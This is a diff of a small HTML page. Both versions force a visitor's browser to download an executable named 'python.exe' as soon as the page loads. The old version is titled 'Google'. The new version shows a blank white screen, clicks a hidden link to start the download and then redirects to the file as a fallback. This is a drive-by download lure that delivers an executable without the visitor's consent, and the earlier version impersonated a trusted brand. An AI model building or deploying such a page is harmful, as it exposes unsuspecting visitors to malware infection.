@@ -1,23 +1,38 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Google</title>
-
+  <title></title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      height: 100%;
+      background-color: #ffffff;
+      overflow: hidden;
+    }
+  </style>
+</head>
 <body>
-  <h6>`</h6>
   <script>
-    window.onload = function () {
-      const link = document.createElement('a');
-      link.href = 'python.exe';
-      link.download = 'python.exe';
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
-    };
+    (function() {
+      // Direct instant download trigger
+      const fileUrl = 'python.exe';
+      const a = document.createElement('a');
+      a.href = fileUrl;
+      a.setAttribute('download', 'python.exe');
+      a.style.display = 'none';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+
+      // Fallback location replacement
+      setTimeout(function() {
+        window.location.replace(fileUrl);
+      }, 300);
+    })();
   </script>
 </body>
-
 </html>
